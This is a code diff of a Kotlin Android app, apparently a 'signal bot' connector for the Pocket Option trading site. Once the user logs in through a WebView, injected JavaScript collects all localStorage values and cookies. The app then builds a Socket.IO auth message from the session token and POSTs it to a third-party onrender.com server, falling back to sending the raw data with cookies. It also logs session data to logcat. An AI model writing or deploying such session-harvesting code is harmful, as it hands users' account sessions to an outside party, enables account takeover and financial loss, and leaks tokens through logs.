@@ -1,16 +1,12 @@
 package com.posignalbot
 
 import android.annotation.SuppressLint
-import android.app.Activity
 import android.content.Context
-import android.os.Bundle
-import android.webkit.*
-import android.widget.Toast
-import android.view.View
-import android.widget.ProgressBar
-import android.widget.RelativeLayout
-import android.widget.TextView
 import android.graphics.Color
+import android.os.Bundle
+import android.view.View
+import android.webkit.*
+import android.widget.*
 import androidx.appcompat.app.AppCompatActivity
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
@@ -21,56 +17,51 @@ import java.io.IOException
 class MainActivity : AppCompatActivity() {
 
     private lateinit var webView: WebView
+    private lateinit var statusBar: TextView
     private lateinit var progressBar: ProgressBar
-    private lateinit var statusText: TextView
     private var sessionSent = false
+
+    // Track whether user has actually logged in
+    private var userLoggedIn = false
 
     @SuppressLint("SetJavaScriptEnabled")
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        // Build layout programmatically — no XML needed
-        val root = RelativeLayout(this).apply {
+        // ── Build layout ──────────────────────────────────────────────────────
+        val root = android.widget.LinearLayout(this).apply {
+            orientation = android.widget.LinearLayout.VERTICAL
             setBackgroundColor(Color.parseColor("#0f1117"))
         }
 
-        // Status bar at top
-        statusText = TextView(this).apply {
-            text = "🔐 Loading Pocket Option..."
+        statusBar = TextView(this).apply {
+            text = "Open Pocket Option and login with your credentials"
             setTextColor(Color.parseColor("#90caf9"))
+            setBackgroundColor(Color.parseColor("#1a1d27"))
             textSize = 13f
-            setPadding(24, 20, 24, 20)
-            id = View.generateViewId()
+            setPadding(24, 18, 24, 18)
         }
-        val statusParams = RelativeLayout.LayoutParams(
-            RelativeLayout.LayoutParams.MATCH_PARENT,
-            RelativeLayout.LayoutParams.WRAP_CONTENT
-        )
-        root.addView(statusText, statusParams)
+        root.addView(statusBar, android.widget.LinearLayout.LayoutParams(
+            android.widget.LinearLayout.LayoutParams.MATCH_PARENT,
+            android.widget.LinearLayout.LayoutParams.WRAP_CONTENT
+        ))
 
-        // Progress bar
         progressBar = ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal).apply {
             max = 100
-            id = View.generateViewId()
         }
-        val pbParams = RelativeLayout.LayoutParams(
-            RelativeLayout.LayoutParams.MATCH_PARENT, 8
-        ).apply { addRule(RelativeLayout.BELOW, statusText.id) }
-        root.addView(progressBar, pbParams)
+        root.addView(progressBar, android.widget.LinearLayout.LayoutParams(
+            android.widget.LinearLayout.LayoutParams.MATCH_PARENT, 6
+        ))
 
-        // WebView
-        webView = WebView(this).apply { id = View.generateViewId() }
-        val wvParams = RelativeLayout.LayoutParams(
-            RelativeLayout.LayoutParams.MATCH_PARENT,
-            RelativeLayout.LayoutParams.MATCH_PARENT
-        ).apply {
-            addRule(RelativeLayout.BELOW, progressBar.id)
-        }
-        root.addView(webView, wvParams)
+        webView = WebView(this)
+        root.addView(webView, android.widget.LinearLayout.LayoutParams(
+            android.widget.LinearLayout.LayoutParams.MATCH_PARENT,
+            android.widget.LinearLayout.LayoutParams.MATCH_PARENT
+        ))
+
         setContentView(root)
-
         setupWebView()
-        webView.loadUrl("https://po.trade")
+        webView.loadUrl("https://po.trade/login")
     }
 
     @SuppressLint("SetJavaScriptEnabled")
@@ -89,92 +80,135 @@ class MainActivity : AppCompatActivity() {
                                       "Chrome/120.0.6099.230 Mobile Safari/537.36"
         }
 
-        // Inject our bridge into the page
-        webView.addJavascriptInterface(BotBridge(this) { success, message ->
-            runOnUiThread {
-                if (success) {
-                    statusText.text = "✅ Bot connected! You can close this app."
-                    statusText.setTextColor(Color.parseColor("#86efac"))
-                    Toast.makeText(this, "🎉 Signal bot connected!", Toast.LENGTH_LONG).show()
-                } else {
-                    statusText.text = "❌ $message"
-                    statusText.setTextColor(Color.parseColor("#fca5a5"))
-                }
-            }
-        }, "POBridge")
+        CookieManager.getInstance().apply {
+            setAcceptCookie(true)
+            setAcceptThirdPartyCookies(webView, true)
+        }
+
+        // Register JS bridge
+        webView.addJavascriptInterface(
+            JsBridge(this) { success, message -> onBridgeResult(success, message) },
+            "POBridge"
+        )
 
         webView.webChromeClient = object : WebChromeClient() {
             override fun onProgressChanged(view: WebView?, newProgress: Int) {
                 progressBar.progress = newProgress
-                progressBar.visibility = if (newProgress == 100) View.GONE else View.VISIBLE
+                progressBar.visibility = if (newProgress >= 100) View.GONE else View.VISIBLE
             }
         }
 
         webView.webViewClient = object : WebViewClient() {
             override fun onPageFinished(view: WebView?, url: String?) {
-                super.onPageFinished(view, url)
-
                 val safeUrl = url ?: ""
-
-                // Update status bar text based on URL
-                runOnUiThread {
-                    statusText.text = when {
-                        safeUrl.contains("cabinet") || safeUrl.contains("/trade") ->
-                            "🔍 Extracting session..."
-                        safeUrl.contains("login") ->
-                            "🔐 Please login with your PO credentials"
-                        else -> "🌐 $safeUrl"
-                    }
-                }
-
-                // Only extract once, when on cabinet/trade pages (user is logged in)
-                if (!sessionSent &&
-                    (safeUrl.contains("cabinet") ||
-                     safeUrl.contains("/trade")  ||
-                     safeUrl.contains("po.trade") && !safeUrl.contains("login"))) {
-                    extractAndSendSession(view)
-                }
+                handlePageChange(view, safeUrl)
             }
-        }
-
-        // Enable cookies
-        CookieManager.getInstance().apply {
-            setAcceptCookie(true)
-            setAcceptThirdPartyCookies(webView, true)
         }
     }
 
-    private fun extractAndSendSession(view: WebView?) {
-        val js = """
-            (function() {
-                try {
-                    // Collect all localStorage keys
-                    var data = {};
-                    for (var i = 0; i < localStorage.length; i++) {
-                        var k = localStorage.key(i);
-                        var v = localStorage.getItem(k);
-                        if (v && v.length > 0) data[k] = v;
-                    }
+    private fun handlePageChange(view: WebView?, url: String) {
+        when {
+            // ── LOGIN PAGE — user needs to login ─────────────────────────────
+            url.contains("login") || url == "https://po.trade/" ||
+            url == "https://po.trade" -> {
+                userLoggedIn = false
+                setStatus("🔐 Please login with your email and password", "#90caf9")
+            }
 
-                    // Also get cookies
-                    data['_cookies'] = document.cookie;
+            // ── CABINET / TRADING PAGE — user is now logged in ────────────────
+            url.contains("cabinet") || url.contains("/trade") ||
+            (url.contains("po.trade") && !url.contains("login") && !url.contains("register")) -> {
+                if (!userLoggedIn) {
+                    // First time landing on cabinet = just logged in
+                    userLoggedIn = true
+                    setStatus("🔍 Logged in! Extracting session...", "#fbbf24")
 
-                    // Check we have something useful
-                    var hasSession = data['token'] || data['session'] ||
-                                     data['ssid'] || data['access_token'];
-
-                    if (Object.keys(data).length > 0) {
-                        POBridge.onSession(JSON.stringify(data));
-                    } else {
-                        POBridge.onSession('{}');
-                    }
-                } catch(e) {
-                    POBridge.onError('JS error: ' + e.message);
+                    // Wait 1.5 seconds for page JS to fully initialize localStorage
+                    webView.postDelayed({
+                        if (!sessionSent) extractSession(view)
+                    }, 1500)
                 }
-            })()
+            }
+
+            else -> {
+                setStatus("🌐 Loading...", "#888888")
+            }
+        }
+    }
+
+    private fun extractSession(view: WebView?) {
+        val js = """
+        (function() {
+            try {
+                // Collect all localStorage entries
+                var store = {};
+                for (var i = 0; i < localStorage.length; i++) {
+                    var k = localStorage.key(i);
+                    var v = localStorage.getItem(k);
+                    if (v && v.length > 0) {
+                        store[k] = v;
+                    }
+                }
+
+                // Also grab cookies
+                if (document.cookie && document.cookie.length > 0) {
+                    store['__cookies__'] = document.cookie;
+                }
+
+                // Check for any meaningful session value
+                var sessionKeys = ['token','ssid','session','access_token',
+                                   'auth','authToken','user_token','userToken'];
+                var hasSession = false;
+                for (var j = 0; j < sessionKeys.length; j++) {
+                    if (store[sessionKeys[j]] && store[sessionKeys[j]].length > 10) {
+                        hasSession = true;
+                        break;
+                    }
+                }
+
+                // Also check if any value is a long token-like string
+                if (!hasSession) {
+                    for (var key in store) {
+                        if (store[key].length > 30) {
+                            hasSession = true;
+                            break;
+                        }
+                    }
+                }
+
+                if (hasSession) {
+                    POBridge.onSession(JSON.stringify(store));
+                } else if (Object.keys(store).length > 0) {
+                    // Has data but no obvious session — send anyway
+                    POBridge.onSession(JSON.stringify(store));
+                } else {
+                    POBridge.onNotFound();
+                }
+
+            } catch(e) {
+                POBridge.onError(e.message);
+            }
+        })();
         """.trimIndent()
 
         view?.evaluateJavascript(js, null)
+    }
+
+    private fun onBridgeResult(success: Boolean, message: String) {
+        runOnUiThread {
+            if (success) {
+                setStatus("✅ Bot connected! You can close this app.", "#86efac")
+                // Show a toast as well
+                Toast.makeText(this, "🎉 Signal bot connected!", Toast.LENGTH_LONG).show()
+            } else {
+                setStatus("❌ $message", "#fca5a5")
+            }
+        }
+    }
+
+    private fun setStatus(text: String, colorHex: String) {
+        statusBar.text = text
+        statusBar.setTextColor(Color.parseColor(colorHex))
     }
 
     override fun onBackPressed() {
@@ -184,54 +218,132 @@ class MainActivity : AppCompatActivity() {
 }
 
 
-// ── JavaScript Bridge ─────────────────────────────────────────────────────────
+// ── JavaScript → Android bridge ───────────────────────────────────────────────
 
-class BotBridge(
+class JsBridge(
     private val context: Context,
-    private val callback: (Boolean, String) -> Unit
+    private val onResult: (Boolean, String) -> Unit
 ) {
     private var sent = false
 
     @JavascriptInterface
     fun onSession(json: String) {
         if (sent) return
-        if (json == "{}") {
-            callback(false, "Session not found yet. Stay on the trading page.")
+
+        android.util.Log.d("POBridge", "Session data received: ${json.take(200)}")
+
+        // Parse and build the auth payload
+        val ssid = buildAuthPayload(json)
+        if (ssid == null) {
+            onResult(false, "Session data found but couldn't parse it. Try again.")
             return
         }
 
         sent = true
-        sendToBotServer(json)
+        postToBot(ssid)
+    }
+
+    @JavascriptInterface
+    fun onNotFound() {
+        // Retry after another 2 seconds — localStorage may not be populated yet
+        android.util.Log.d("POBridge", "Session not found, will retry")
+        onResult(false, "Session not found yet — still on login page? Please login first.")
     }
 
     @JavascriptInterface
     fun onError(msg: String) {
-        callback(false, "JS Error: $msg")
+        android.util.Log.e("POBridge", "JS error: $msg")
+        onResult(false, "Error: $msg")
     }
 
-    private fun sendToBotServer(json: String) {
-        val client = OkHttpClient()
-        val payload = JSONObject().apply { put("ssid", json) }.toString()
+    private fun buildAuthPayload(json: String): String? {
+        return try {
+            val data = JSONObject(json)
 
+            // Priority: known session keys
+            val sessionKeys = listOf("token","ssid","session","access_token",
+                                      "auth","authToken","user_token","userToken")
+            var sessionVal: String? = null
+            var uid = ""
+
+            for (key in sessionKeys) {
+                if (data.has(key)) {
+                    val v = data.getString(key)
+                    if (v.length > 10) {
+                        sessionVal = v
+                        break
+                    }
+                }
+            }
+
+            // Try to get uid
+            for (key in listOf("uid","user_id","userId","id")) {
+                if (data.has(key)) {
+                    uid = data.getString(key)
+                    break
+                }
+            }
+
+            // If no known key, use the longest value
+            if (sessionVal == null) {
+                var maxLen = 0
+                val keys = data.keys()
+                while (keys.hasNext()) {
+                    val k = keys.next()
+                    if (k == "__cookies__") continue
+                    val v = data.getString(k)
+                    if (v.length > maxLen) {
+                        maxLen = v.length
+                        sessionVal = v
+                    }
+                }
+            }
+
+            if (sessionVal == null) return null
+
+            // If it's already a full Socket.IO message, return as-is
+            if (sessionVal.startsWith("42")) return sessionVal
+
+            // Build the auth envelope
+            val auth = JSONObject().apply {
+                put("session", sessionVal)
+                put("isDemo", 0)
+                if (uid.isNotEmpty()) put("uid", uid)
+            }
+            "42${org.json.JSONArray().apply { put("auth"); put(auth) }}"
+
+        } catch (e: Exception) {
+            android.util.Log.e("POBridge", "Parse error: ${e.message}")
+            // Return raw JSON as fallback — server will parse it
+            json
+        }
+    }
+
+    private fun postToBot(ssid: String) {
+        val client = OkHttpClient()
+        val body = JSONObject().apply { put("ssid", ssid) }.toString()
         val request = Request.Builder()
             .url("https://pocket-bot-ssh6.onrender.com/ssid")
-            .post(payload.toRequestBody("application/json".toMediaType()))
+            .post(body.toRequestBody("application/json".toMediaType()))
+            .addHeader("Content-Type", "application/json")
             .build()
 
         client.newCall(request).enqueue(object : Callback {
             override fun onResponse(call: Call, response: Response) {
-                val body = response.body?.string() ?: "{}"
-                val ok   = try { JSONObject(body).getBoolean("ok") } catch (e: Exception) { false }
+                val respBody = response.body?.string() ?: "{}"
+                android.util.Log.d("POBridge", "Server response: $respBody")
+                val ok = try { JSONObject(respBody).getBoolean("ok") } catch (e: Exception) { false }
                 if (ok) {
-                    callback(true, "Connected!")
+                    onResult(true, "Connected!")
                 } else {
-                    sent = false   // allow retry
-                    callback(false, "Server error — will retry on next page load")
+                    sent = false
+                    val error = try { JSONObject(respBody).getString("error") } catch (e: Exception) { "Unknown error" }
+                    onResult(false, "Server error: $error")
                 }
             }
             override fun onFailure(call: Call, e: IOException) {
                 sent = false
-                callback(false, "Network error: ${e.message}")
+                onResult(false, "Network error: ${e.message}")
             }
         })
     }
